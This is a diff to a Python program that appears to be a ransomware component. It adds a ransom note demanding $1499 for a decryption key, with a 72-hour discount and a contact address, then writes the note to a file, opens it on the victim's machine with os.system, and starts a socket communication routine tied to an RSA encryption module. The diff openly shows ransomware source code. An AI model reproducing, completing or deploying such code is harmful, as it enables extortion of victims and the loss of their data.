@@ -6,6 +6,7 @@ import shutil
 import os
 import sys
 import rsa
+import time
 
 from Utilities.Encryption.rsa import encrypt
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -92,4 +93,34 @@ def start_comm():
             print("done")
             break
 
+txt = """
+***********************************************************************
+ATTENTION!! 
+***********************************************************************
+
+All of your data is encrypted.
+Don't worry, you can return all your files!
+The only method of recovering files is to purchase decrypt tool and unique key for you.
+What guarantees you have?
+You can send one of your encrypted files from your PC and we decrypt it for free.
+But we can decrypt only 1 file for free. File must not contain valuable information.
+
+Price of the private key and the decrypt software is $1499.
+Discount 50% is available if you contact us in the first 72 hours from now.
+
+Please note that you'll never restore your data without payment.
+
+************************************************************************
+
+Reserve this email address to contact us:
+ransomwaregroup@ransom.hacked
+
+Have a nice day :)
+*************************************************************************
+"""
+
+
+with open("ransom_message.txt",'w') as f:
+    f.write(txt)
+os.system(f'start ransom_message.txt')
 start_comm()
